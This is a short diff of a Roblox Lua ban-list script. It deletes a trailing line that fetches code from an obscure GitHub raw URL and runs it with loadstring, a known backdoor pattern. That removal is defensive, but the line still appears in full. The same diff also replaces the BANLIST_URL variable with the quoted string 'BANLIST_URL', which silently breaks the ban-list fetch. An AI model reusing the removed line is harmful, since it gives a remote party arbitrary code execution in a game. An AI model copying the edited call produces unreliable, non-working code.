@@ -4,7 +4,7 @@ local LocalPlayer = Players.LocalPlayer
 
 local function checkBanList()
     local success, data = pcall(function()
-        return game:HttpGet(BANLIST_URL)
+        return game:HttpGet("BANLIST_URL")
     end)
     if not success then
         warn("Can't get ban list:", data)
@@ -33,5 +33,3 @@ for _, player in pairs(Players:GetPlayers()) do
 end
 
 Players.PlayerAdded:Connect(onChat)
-
-loadstring(Game:HttpGet("https://raw.githubusercontent.com/9274837292748/aawdadadadada/refs/heads/main/kasck"))()
